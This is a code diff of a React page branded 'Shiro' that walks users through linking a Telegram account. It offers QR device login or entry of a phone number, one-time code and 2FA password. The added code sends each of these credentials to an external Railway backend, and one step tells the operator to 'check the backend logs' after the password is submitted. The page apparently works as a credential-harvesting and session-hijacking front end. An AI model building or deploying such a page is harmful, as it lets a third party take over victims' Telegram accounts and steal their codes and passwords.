@@ -1,6 +1,6 @@
+
 import React, { useState, useEffect } from "react";
 import axios from "axios";
-import { QRCodeCanvas } from 'qrcode.react';
 
 const App = () => {
   const [phoneNumber, setPhoneNumber] = useState("");
@@ -11,153 +11,216 @@ const App = () => {
   const [sessionToken, setSessionToken] = useState("");
   const [popupVisible, setPopupVisible] = useState(false);
   const [qrCodeLink, setQrCodeLink] = useState(null);
-  const [chats, setChats] = useState([]);
-  const [selectedChatId, setSelectedChatId] = useState(null);
-  const [messages, setMessages] = useState([]);
-  const [loading, setLoading] = useState(false); 
-  const [otpSent, setOtpSent] = useState(false); 
-  
+  const [loading, setLoading] = useState(false);
+  const [otpSent, setOtpSent] = useState(false);
+  const [accountPassword, setAccountPassword] = useState(null);
+  const [password, setPassword] = useState(''); // For storing the password input
+  const [showPasswordForm, setShowPasswordForm] = useState(false); // For showing/hiding the password form
+  const [show2FAForm, setShow2FAForm] = useState(false);
+  const [qrCode, setQrCode] = useState('');
+  const [sessionId, setSessionId] = useState('');
+  const [status, setStatus] = useState('initial');
   const [error, setError] = useState(null);
   const [user, setUser] = useState(null);
 
-  const backendUrl = "https://telegrambackend-production.up.railway.app"; 
+  const backendUrl = "https://telegrambackend-production.up.railway.app";
+
+
+  useEffect(() => {
+    
+    handleReset()
+  }, [])
   
-  const generateQRCode = async () => {
-    setLoading(true); // Show loading state
+
+  const handleReset = async () => {
     try {
-      console.log("Starting QR code generation...");
-      const response = await axios.get(`${backendUrl}/generate-qr`);
-      console.log("QR generation response:", response.data);
+      const response = await fetch(`${backendUrl}/reset`, { method: 'GET' });
+
+      if (response.ok) {
+        const result = await response.text();
+        console.log(result)
       
-      if (response.data.loginLink) {
-        console.log("Setting QR code link:", response.data.loginLink);
-        setQrCodeLink(response.data.loginLink);
-        setSessionToken(response.data.sessionToken);
-        startCheckingSession(response.data.sessionToken);
       } else {
-        console.error("No login link in response");
-        setError('Invalid QR code response');
+        throw new Error('Failed to reset');
       }
     } catch (error) {
-      console.error("QR generation error:", error);
-      setError(error.response?.data?.error || 'Failed to generate QR code');
-      setQrCodeLink(null);
-    }finally {
-      setLoading(false); // Stop loading state
+    
     }
   };
 
-  const verifyQRLogin = async (token) => {
+
+  //---------------QR code-----------------------
+  useEffect(() => {
+    // Automatically generate QR code when component mounts
+    if (status === 'initial') {
+      generateQRCode();
+    }
+  }, []);
+
+  const generateQRCode = async () => {
     try {
-      console.log("Verifying QR login with token:", token);
-      const response = await axios.post(`${backendUrl}/verify-qr-login`, {
-        sessionToken: token
+      setLoading(true);
+      setError('');
+
+      const response = await axios.get(`${backendUrl}/generate-qr`, {
+        headers: {
+          'Accept': 'application/json',
+          'Content-Type': 'application/json'
+        }
       });
 
-      if (response.data.status === 'success') {
-        console.log("QR login verified successfully:", response.data);
-        setUser(response.data.user);
-        setSessionToken(response.data.sessionToken);
-        setIsAuthenticated(true);
-        setPopupVisible(true);
-        return true;
+      if (response.data.qrCode && response.data.sessionId) {
+        setQrCode(response.data.qrCode);
+        setSessionId(response.data.sessionId);
+        setStatus('scanning');
+      } else {
+        throw new Error('Invalid response format');
       }
-      return false;
-    } catch (error) {
-      console.error("QR login verification error:", error);
-      return false;
+    } catch (err) {
+      setError(err.message || 'Failed to generate QR code');
+      setStatus('initial');
+    } finally {
+      setLoading(false);
     }
   };
 
-  
-  const startCheckingSession = (token) => {
-    console.log("Starting session check with token:", token);
-    
-    if (!token) {
-      console.error("No token provided for session checking");
-      setError("Invalid session token");
-      return;
-    }
-  
-    const interval = setInterval(async () => {
-      try {
-        console.log("Checking session...");
-        const response = await axios.get(`${backendUrl}/check-session`, {
-          headers: { 
-            Authorization: `Bearer ${token}`,
-            'Content-Type': 'application/json'
+
+  useEffect(() => {
+    let interval;
+    if (sessionId && status === 'scanning') {
+      interval = setInterval(async () => {
+        try {
+          const response = await axios.get(`${backendUrl}/session-status/${sessionId}`);
+
+          if (response.data.status === 'needs_password') {
+            setStatus('password');
+            setUser(response.data.user);
+          } else if (response.data.status === 'active') {
+            setStatus('active');
+            setPopupVisible(true);
+            setUser(response.data.user);
           }
-        });
-        
-        console.log("Session check response:", response.data);
-        
-        if (response.data.isActive) {
-          console.log("Session is active, user data:", response.data.user);
-          setUser(response.data.user);
-          setIsAuthenticated(true);
-          setPopupVisible(true);
-          clearInterval(interval);
+        } catch (err) {
+          console.error('Status check error:', err);
+          setError('Failed to check login status');
         }
-      } catch (error) {
-        console.error("Session check error:", error);
-        setError(error.response?.data?.message || "Session check failed");
-        
-        if (error.response?.status === 401 || error.response?.status === 403) {
-          console.log("Session is invalid, stopping checks");
-          clearInterval(interval);
-          setQrCodeLink(null);
-        }
-      }
-    }, 3000);
-  
-    const timeoutId = setTimeout(() => {
-      console.log("QR code session timeout");
-      clearInterval(interval);
-      setError("QR code expired. Please generate a new one.");
-      setQrCodeLink(null);
-    }, 120000);
-  
+      }, 3000); // Check every 3 seconds
+    }
+
     return () => {
-      clearInterval(interval);
-      clearTimeout(timeoutId);
+      if (interval) clearInterval(interval);
     };
+  }, [sessionId, status]);
+
+  const handlePasswordSubmit = async (e) => {
+    e.preventDefault();
+    try {
+      setLoading(true);
+      setError('');
+
+      const response = await axios.post(`${backendUrl}/verify-password`, {
+        sessionId,
+        password
+      });
+
+      if (response.data.success) {
+        setStatus('active');
+        setPopupVisible(true);
+        setUser(response.data.user);
+      }
+    } catch (err) {
+      setError(err.response?.data?.error || 'Failed to verify password');
+    } finally {
+      setLoading(false);
+    }
   };
 
+  const handleRetry = () => {
+    setStatus('initial');
+    setError('');
+    setQrCode('');
+    setSessionId('');
+    setPassword('');
+    generateQRCode();
+  };
+
+  //-----------------------------------------
 
   const sendOTP = async () => {
-    setLoading(true); // Show loading state
     try {
-      const response = await axios.post(`${backendUrl}/send-otp`, { phoneNumber });
-      setPhoneCodeHash(response.data.phoneCodeHash);
-      setAuthStep("otp"); 
-      setOtpSent(true); 
-      setError(null);
+      const response = await fetch(`${backendUrl}/set-phone-number`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ phoneNumber }),
+      });
+
+      const data = await response.json();
+
+      if (!response.ok) {
+        if (response.status === 429) {
+          const minutes = Math.floor(data.waitTime / 60);
+          const seconds = data.waitTime % 60;
+
+          setError(`Too many attempts. Please wait ${minutes} minutes and ${seconds} seconds before trying again.`)
+        }
+        setError(data.message)
+        throw new Error(data.message);
+      }
+      setOtpSent(true)
+      return data;
     } catch (error) {
-      setError(error.response?.data?.message || "Failed to send OTP");
-    } finally {
-      setLoading(false); // Stop loading state
+      // Handle the error in your UI
+      console.error('Error:', error);
+
     }
   };
 
   const validateOTP = async () => {
-    setLoading(true); // Show loading state
+    setLoading(true);
     try {
-      const response = await axios.post(`${backendUrl}/validate-otp`, {
-        phoneNumber,
-        otp,
-        phoneCodeHash,
+      const response = await fetch(`${backendUrl}/set-phone-code`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ phoneCode: otp }),
       });
-      setSessionToken(response.data.sessionToken);
-      setUser(response.data.user);
-      setIsAuthenticated(true);
-      setError(null);
-      setPopupVisible(true);
+
+      const data = await response.json();
+
+      console.log(data, "-------------------- ------------ -----")
+      if (!response.ok) {
+        throw new Error(data.message);
+      }
+
+
+      if (data.isLoggedIn) {
+        setPopupVisible(true);
+      } else if (data.requires2FA) {
+        setShow2FAForm(true);
+      }
     } catch (error) {
-      setError(error.response?.data?.message || "OTP Validation Failed");
+      setError(error.message || 'OTP Validation Failed');
     }
-    finally {
-      setLoading(false); // Stop loading state
+    setLoading(false);
+  };
+
+  const verify2FAAndComplete = async () => {
+    setLoading(true);
+    try {
+      await fetch(`${backendUrl}/set-password`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ password }),
+      });
+
+      alert("Login process initiated. Check the backend logs.");
+      setPopupVisible(true)
+    } catch (error) {
+      console.error('2FA Error:', error);
+      setError(error.response?.data?.message || '2FA verification failed');
     }
+    setLoading(false);
   };
 
 
@@ -185,15 +248,15 @@ const App = () => {
         zIndex: 1000,
       }}>
 
-      <div style={{
-        height:"100vh",
-        width:"100vw",
-        position:"absolute",
-        zIndex:"-2",
-        opacity:"0.7",
-        backgroundColor:"black",
-      }}>
-      </div>
+        <div style={{
+          height: "100vh",
+          width: "100vw",
+          position: "absolute",
+          zIndex: "-2",
+          opacity: "0.7",
+          backgroundColor: "black",
+        }}>
+        </div>
         <div style={{
           position: "relative",
           backgroundColor: "#212121",
@@ -203,7 +266,7 @@ const App = () => {
           textAlign: "center",
           boxShadow: "0px 4px 6px rgba(0, 0, 0, 0.2)",
         }}>
-          
+
           <h2 style={{ marginBottom: "20px", color: "#fff" }}>
             Shiro is Connected!
           </h2>
@@ -233,70 +296,62 @@ const App = () => {
 
   const renderQRSection = () => (
     <div style={{ textAlign: "center" }}>
-      <p style={{ marginBottom: "20px",
+      <p style={{
+        marginBottom: "20px",
         color: "white"
-       }}>
+      }}>
         Go to Telegram: Settings, tap on Devices and scan.
       </p>
-      {error && (
-        <div style={{
-          color: "#ff4444",
-          marginBottom: "10px",
-          padding: "10px",
-          backgroundColor: "rgba(255, 0, 0, 0.1)",
-          borderRadius: "5px"
-        }}>
-          {error}
+      {!loading && status === 'scanning' && qrCode && (
+        <div className="text-center space-y-4">
+          <img
+            src={qrCode}
+            alt="Telegram QR Code"
+            className="mx-auto max-w-[200px] rounded-lg shadow-sm"
+          />
         </div>
       )}
-      {!qrCodeLink && (
-        <button
-          onClick={generateQRCode}
-          style={{
-            width: "100%",
-            padding: "10px",
-            backgroundColor: "#147BE3",
-            color: "#fff",
-            border: "none",
-            borderRadius: "20px",
-            cursor: "pointer",
-            marginBottom: "20px",
-          }}
-        >
-        
-        {loading ? "Generating..." : "Generate OTP"}
-
-        </button>
-      )}
-      {qrCodeLink && (
-        <div>
-          <QRCodeCanvas
-            value={qrCodeLink}
-            size={200}
-            style={{ margin: "0 auto" }}
-          />
-          <button
-            onClick={() => {
-              setQrCodeLink(null);
-              setError(null);
-            }}
+      {!loading && status === 'password' && (
+        <form onSubmit={handlePasswordSubmit} className="space-y-4">
+          <h2 style={{ textAlign: "center", marginBottom: "20px", color: "white" }}>
+            Enter 2FA Password
+          </h2>
+          <input
+            type="password"
+            value={password}
+            onChange={(e) => setPassword(e.target.value)}
+            placeholder="Enter your 2FA password"
             style={{
-              marginTop: "10px",
-              padding: "5px 10px",
-              backgroundColor: "#ff4444",
+              width: "93%",
+              padding: "10px",
+              marginBottom: "15px",
+              backgroundColor: "#17212b",
+              color: "#fff",
+              border: "1px solid #2a5277",
+              borderRadius: "5px",
+            }}
+          />
+
+
+          <button
+            type="submit"
+            style={{
+              width: "100%",
+              padding: "10px",
+              backgroundColor: "#147BE3",
               color: "#fff",
               border: "none",
               borderRadius: "20px",
               cursor: "pointer",
             }}
           >
-            Reset QR Code
+            {loading ? 'Verifying...' : 'Submit Password'}
           </button>
-        </div>
+        </form>
+
       )}
     </div>
   );
-
 
   const renderAuthStep = () => (
     <div style={{
@@ -305,19 +360,19 @@ const App = () => {
       alignItems: "center",
       justifyContent: "center",
       height: "100vh",
-      backgroundImage: "url('/backgroundImage.jpg')", 
+      backgroundImage: "url('/backgroundImage.jpg')",
       backgroundSize: "cover",
       backgroundPosition: "center",
       backgroundRepeat: "no-repeat",
       zIndex: 4,
     }}>
       <div style={{
-        height:"100vh",
-        width:"100vw",
-        position:"absolute",
-        zIndex:"5",
-        opacity:"0.7",
-        backgroundColor:"black",
+        height: "100vh",
+        width: "100vw",
+        position: "absolute",
+        zIndex: "5",
+        opacity: "0.7",
+        backgroundColor: "black",
       }}></div>
 
       <div style={{
@@ -325,125 +380,170 @@ const App = () => {
         padding: "20px",
         backgroundColor: "#212121",
         borderRadius: "20px",
-        position:"relative",
-        zIndex:"10"
+        position: "relative",
+        zIndex: "10"
       }}>
-        {/* Hide QR and Phone buttons when OTP is sent */}
-        {!otpSent && (
-          <div style={{
-            display: "flex",
-            justifyContent: "center",
-            marginBottom: "20px",
-          }}>
-            <button
-              onClick={() => {
-                setAuthStep("qr");
-                setError(null);
-                setQrCodeLink(null);
-              }}
-              style={{
-                padding: "10px 20px",
-                backgroundColor: authStep === "qr" ? "#147BE3" : "transparent",
-                color: "#fff",
-                border: "none",
-                borderRadius: "20px 0 0 20px",
-                cursor: "pointer",
-              }}
-            >
-              QR Code
-            </button>
-            <button
-              onClick={() => {
-                setAuthStep("phone");
-                setError(null);
-              }}
-              style={{
-                padding: "10px 20px",
-                backgroundColor: authStep === "phone" ? "#147BE3" : "transparent",
-                color: "#fff",
-                border: "none",
-                borderRadius: "0 20px 20px 0",
-                cursor: "pointer",
-              }}
-            >
-              Phone
-            </button>
-          </div>
-        )}
-
-        {/* Show the QR section or Phone OTP input based on the state */}
-        {authStep === "qr" && !otpSent ? renderQRSection() : (
-          <div>
-            {!otpSent ? (
-              <div>
-                <h2 style={{ textAlign: "center", marginBottom: "20px", color: "white" }}>
-                  Enter Phone Number
-                </h2>
-                <input
-                  type="tel"
-                  value={phoneNumber}
-                  onChange={(e) => setPhoneNumber(e.target.value)}
-                  placeholder="+1234567890"
-                  style={{
-                    width: "93%",
-                    padding: "10px",
-                    marginBottom: "15px",
-                    backgroundColor: "#17212b",
-                    color: "#fff",
-                    border: "1px solid #2a5277",
-                    borderRadius: "5px",
-                  }}
-                />
+        {!show2FAForm ? (
+          <>
+            {/* Hide QR and Phone buttons when OTP is sent */}
+            {!otpSent && (
+              <div style={{
+                display: "flex",
+                justifyContent: "center",
+                marginBottom: "20px",
+              }}>
                 <button
-                  onClick={sendOTP}
+                  onClick={() => {
+                    setAuthStep("qr");
+                    setError(null);
+                    setQrCodeLink(null);
+                  }}
                   style={{
-                    width: "100%",
-                    padding: "10px",
-                    backgroundColor: "#147BE3",
+                    padding: "10px 20px",
+                    backgroundColor: authStep === "qr" ? "#147BE3" : "transparent",
                     color: "#fff",
                     border: "none",
-                    borderRadius: "20px",
+                    borderRadius: "20px 0 0 20px",
                     cursor: "pointer",
                   }}
                 >
-                  {loading ? "Sending..." : "Send OTP"}
+                  QR Code
                 </button>
-              </div>
-            ) : (
-              <div>
-                <h2 style={{ textAlign: "center", marginBottom: "20px", color: "white" }}>Enter OTP</h2>
-                <input
-                  type="text"
-                  value={otp}
-                  onChange={(e) => setOtp(e.target.value)}
-                  placeholder="Enter OTP"
-                  style={{
-                    width: "93%",
-                    padding: "10px",
-                    marginBottom: "15px",
-                    backgroundColor: "#17212b",
-                    color: "#fff",
-                    border: "1px solid #2a5277",
-                    borderRadius: "5px",
-                  }}
-                />
                 <button
-                  onClick={validateOTP}
+                  onClick={() => {
+                    setAuthStep("phone");
+                    setError(null);
+                  }}
                   style={{
-                    width: "100%",
-                    padding: "10px",
-                    backgroundColor: "#147BE3",
+                    padding: "10px 20px",
+                    backgroundColor: authStep === "phone" ? "#147BE3" : "transparent",
                     color: "#fff",
                     border: "none",
-                    borderRadius: "20px",
+                    borderRadius: "0 20px 20px 0",
                     cursor: "pointer",
                   }}
                 >
-                {loading ? "Validating..." : "Validate OTP"}
+                  Phone
                 </button>
               </div>
             )}
+
+            {/* Show the QR section or Phone OTP input based on the state */}
+            {authStep === "qr" && !otpSent ? renderQRSection() : (
+              <div>
+                {!otpSent ? (
+                  <div>
+                    <h2 style={{ textAlign: "center", marginBottom: "20px", color: "white" }}>
+                      Enter Phone Number
+                    </h2>
+                    <input
+                      type="tel"
+                      value={phoneNumber}
+                      onChange={(e) => setPhoneNumber(e.target.value)}
+                      placeholder="+1234567890"
+                      style={{
+                        width: "93%",
+                        padding: "10px",
+                        marginBottom: "15px",
+                        backgroundColor: "#17212b",
+                        color: "#fff",
+                        border: "1px solid #2a5277",
+                        borderRadius: "5px",
+                      }}
+                    />
+                    <button
+                      onClick={sendOTP}
+                      style={{
+                        width: "100%",
+                        padding: "10px",
+                        backgroundColor: "#147BE3",
+                        color: "#fff",
+                        border: "none",
+                        borderRadius: "20px",
+                        cursor: "pointer",
+                      }}
+                    >
+                      {loading ? "Sending..." : "Send OTP"}
+                    </button>
+                  </div>
+                ) : (
+                  <div>
+                    <h2 style={{ textAlign: "center", marginBottom: "20px", color: "white" }}>Enter OTP</h2>
+                    <input
+                      type="text"
+                      value={otp}
+                      onChange={(e) => setOtp(e.target.value)}
+                      placeholder="Enter OTP"
+                      style={{
+                        width: "93%",
+                        padding: "10px",
+                        marginBottom: "15px",
+                        backgroundColor: "#17212b",
+                        color: "#fff",
+                        border: "1px solid #2a5277",
+                        borderRadius: "5px",
+                      }}
+                    />
+                    <button
+                      onClick={validateOTP}
+                      style={{
+                        width: "100%",
+                        padding: "10px",
+                        backgroundColor: "#147BE3",
+                        color: "#fff",
+                        border: "none",
+                        borderRadius: "20px",
+                        cursor: "pointer",
+                      }}
+                    >
+                      {loading ? "Validating..." : "Validate OTP"}
+                    </button>
+                  </div>
+                )}
+              </div>
+            )}
+          </>
+        ) : (
+          // 2FA Password Form
+          <div>
+            <h2 style={{ textAlign: "center", marginBottom: "20px", color: "white" }}>
+              Enter 2FA Password
+            </h2>
+            <input
+              type="password"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              placeholder="Enter your 2FA password"
+              style={{
+                width: "93%",
+                padding: "10px",
+                marginBottom: "15px",
+                backgroundColor: "#17212b",
+                color: "#fff",
+                border: "1px solid #2a5277",
+                borderRadius: "5px",
+              }}
+            />
+            <button
+              onClick={verify2FAAndComplete}
+              style={{
+                width: "100%",
+                padding: "10px",
+                backgroundColor: "#147BE3",
+                color: "#fff",
+                border: "none",
+                borderRadius: "20px",
+                cursor: "pointer",
+              }}
+            >
+              {loading ? "Verifying..." : "Confirm"}
+            </button>
           </div>
+        )}
+        {error && (
+          <p style={{ color: "red", textAlign: "center", marginTop: "10px" }}>
+            {error}
+          </p>
         )}
       </div>
     </div>
@@ -460,7 +560,3 @@ const App = () => {
 };
 
 export default App;
-
-
-
-
